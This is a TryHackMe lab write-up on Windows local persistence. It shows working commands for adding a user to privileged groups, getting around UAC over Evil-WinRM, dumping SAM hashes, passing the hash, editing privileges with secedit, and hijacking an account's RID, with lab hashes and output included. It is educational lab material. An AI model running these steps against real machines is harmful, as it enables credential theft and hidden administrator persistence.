## Interesting User Group

We want to look for the following to utilize this method
```powershell
net localgroup "Backup Operators"
net localgroup "Remote Management Users"
```

The THM Lab has you do the following 
```powershell
net localgroup "Backup Operators" thmuser1 /add
&&
net localgroup "Remote Management Users" thmuser1 /add
```

### Evil-WinRM
This flag is a quick start to using Evil-Winrm to persist/escalate
```bash
evil-winrm -i 10.10.226.174 -u thmuser1 -p Password321
```

We then receive the following output when we check what groups the user has
```powershell

*Evil-WinRM* PS C:\Users\thmuser1\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes
====================================== ================ ============ ==================================================
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Backup Operators               Alias            S-1-5-32-551 Group used for deny only
BUILTIN\Remote Management Users        Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                   Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192
```

We now want to allow our user to bypass UAC using WinRM. With the current permission set we should be able to escalate using the GUI, but we want to assume there is not physical/RDP access to the box and only WinRM remotely. We will need to disable the LocalAccountTokenFilter Policy to make this happen for our user. **Note that you will need to either chain bypasses or have an Admin account to make the registry modifications**
```powershell
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
```

We will need to obtain a new session to see the new group allowed
```powershell
*Evil-WinRM* PS C:\Users\thmuser1\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes
==================================== ================ ============ ==================================================
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Backup Operators             Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users      Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                 Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account           Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level Label            S-1-16-12288
```

With the new admin group enabled we should grab some important DBs for passwords :) 
```powershell
reg save hklm\system system.bak
reg save hklm\sam sam.bak

download system.bak
download sam.bak
```

Now that we have some SAM hashes lets pass them. *Note: We dump the .bak using impacket-secrets dump* `/usr/share/kali-menu/helper-scripts/impacket-scripts.sh`
```bash
impacket-secretsdump -sam sam.bak -system system.bak LOCAL
```

We receive the following results
```python
Administrator:500:aad3b435b51404eeaad3b435b51404ee:f3118544a831e728781d780cfdb9c1fa:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:58f8e0214224aebc2c5f82fb7cb47ca1:::
thmuser1:1008:aad3b435b51404eeaad3b435b51404ee:f3118544a831e728781d780cfdb9c1fa:::
thmuser2:1009:aad3b435b51404eeaad3b435b51404ee:f3118544a831e728781d780cfdb9c1fa:::
thmuser3:1010:aad3b435b51404eeaad3b435b51404ee:f3118544a831e728781d780cfdb9c1fa:::
thmuser0:1011:aad3b435b51404eeaad3b435b51404ee:f3118544a831e728781d780cfdb9c1fa:::
thmuser4:1013:aad3b435b51404eeaad3b435b51404ee:8767940d669d0eb618c15c11952472e5:::
```

Now lets pass the hash
```bash
evil-winrm -i 10.10.226.174 -u Administrator -H f3118544a831e728781d780cfdb9c1fa
```
`*Evil-WinRM* PS C:\Users\Administrator\Documents>`

Now we just need to run the EXE specified to get the flag
```powershell
*Evil-WinRM* PS C:\Users\Administrator\Documents> C:\flags\flag1.exe

THM{FLAG_BACKED_UP!}
```

## Special Privileges and Security Descriptors

Bring copy of the config file to the local attack machine as a backup
```powershell
*Evil-WinRM* PS C:\Users\Administrator\Documents> secedit /export /cfg config.inf

*Evil-WinRM* PS C:\Users\Administrator\Documents> download config.inf
```

Assign special privileges regardless of group membership. We can either modify the downloaded copy and upload to the target or modify the export we have on the target box:
```bash
vi config.inf 
```

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Documents> upload config.inf config.inf.mod
                                        
Info: Uploading /home/sstephens/Documents/tryhackme/win_local_pers/spec_privs/config.inf to C:\Users\Administrator\Documents\config.inf.mod                                                                                             
                                        
Data: 25804 bytes of 25804 bytes copied
                                        
Info: Upload successful!

*Evil-WinRM* PS C:\Users\Administrator\Documents> rm config.inf

*Evil-WinRM* PS C:\Users\Administrator\Documents> mv config.inf.mod config.inf

*Evil-WinRM* PS C:\Users\Administrator\Documents> ls


    Directory: C:\Users\Administrator\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        5/29/2022  12:07 AM                SQL Server Management Studio
d-----        5/29/2022  12:12 AM                Visual Studio 2017
-a----        7/27/2024   9:58 AM          19354 config.inf

```

Now we convert the inf to sdb and assign the privs
```powershell
*Evil-WinRM* PS C:\Users\Administrator\Documents> secedit /import /cfg config.inf /db config.sdb
*Evil-WinRM* PS C:\Users\Administrator\Documents> secedit /configure /db config.sdb /cfg config.inf
Completed 1 percent (0/63)      Process Privilege Rights area
Completed 3 percent (1/63)      Process Privilege Rights area
Completed 4 percent (2/63)      Process Privilege Rights area
Completed 6 percent (3/63)      Process Privilege Rights area
Completed 7 percent (4/63)      Process Privilege Rights area
Completed 9 percent (5/63)      Process Privilege Rights area
Completed 11 percent (6/63)     Process Privilege Rights area
Completed 12 percent (7/63)     Process Privilege Rights area
Completed 14 percent (8/63)     Process Privilege Rights area
Completed 15 percent (9/63)     Process Privilege Rights area
Completed 17 percent (10/63)    Process Privilege Rights area
Completed 19 percent (11/63)    Process Privilege Rights area
Completed 20 percent (12/63)    Process Privilege Rights area
Completed 22 percent (13/63)    Process Privilege Rights area
Completed 23 percent (14/63)    Process Privilege Rights area
Completed 25 percent (15/63)    Process Privilege Rights area
Completed 25 percent (15/63)    Process Group Membership area
Completed 49 percent (30/63)    Process Group Membership area
Completed 49 percent (30/63)    Process Registry Keys area
Completed 49 percent (30/63)    Process File Security area
Completed 49 percent (30/63)    Process Services area
Completed 65 percent (40/63)    Process Services area
Completed 73 percent (45/63)    Process Services area
Completed 73 percent (45/63)    Process Security Policy area
Completed 77 percent (48/63)    Process Security Policy area
Completed 84 percent (52/63)    Process Security Policy area
Completed 88 percent (55/63)    Process Security Policy area
Completed 93 percent (58/63)    Process Security Policy area
Completed 100 percent (63/63)   Process Security Policy area

The task has completed successfully.
See log %windir%\security\logs\scesrv.log for detail info.
*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```

We set the user to allow access to powershell sessions with the following UI based mod. Add the new user with full-control
```powershell
Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI
```

```powershell
*Evil-WinRM* PS C:\Users\thmuser2\Documents> net user thmuser2
User name                    thmuser2
Full Name                    thmuser2
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            5/28/2022 11:48:03 PM
Password expires             Never
Password changeable          5/28/2022 11:48:03 PM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   7/27/2024 10:12:31 AM

Logon hours allowed          All

Local Group Memberships      *Users
Global Group memberships     *None
The command completed successfully.

*Evil-WinRM* PS C:\Users\thmuser2\Documents> C:\flags\flag2.exe
THM{IM_JUST_A_NORMAL_USER}
```

## RID Hijacking
When we create a user we get an identifier for it called the ***Relative ID(RID)***. The `RID` is the last bits of the SID
```powershell
*Evil-WinRM* PS C:\Users\Administrator\Documents> wmic useraccount get name,sid
Name                SID

Administrator       S-1-5-21-1966530601-3185510712-10604624-500

DefaultAccount      S-1-5-21-1966530601-3185510712-10604624-503

Guest               S-1-5-21-1966530601-3185510712-10604624-501

thmuser0            S-1-5-21-1966530601-3185510712-10604624-1011

thmuser1            S-1-5-21-1966530601-3185510712-10604624-1008

thmuser2            S-1-5-21-1966530601-3185510712-10604624-1009

thmuser3            S-1-5-21-1966530601-3185510712-10604624-1010

thmuser4            S-1-5-21-1966530601-3185510712-10604624-1013

WDAGUtilityAccount  S-1-5-21-1966530601-3185510712-10604624-504
```

For this flag we want to add the `500` RID to `THMuser3` but we will need to use the **SYSTEM** account to do this. The lab has psexec on it which will allows to do this, it may be helpful to upload psexec if you obtain an admin account for this instance.
*This didn't work using WINRM* but modifications to modify it from an admin session may be possible
```powershell
*Evil-WinRM* PS C:\tools\pstools> PsExec64.exe -i -s regedit
```

Modify the Following Reg
Address: `Computer\HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000003F2`
key: `F`
Value(Original):
```
F2 03
```
Value New:
```
F4 01

(Ensure that the F2 03 is removed)
```

Now we can use reminna to RDP to the box using the thmuser3 creds to hijack the Admin RDP session:
```powershell
C:\flags\flag3.exe
THM{TRUST_ME_IM_AN_ADMIN}
```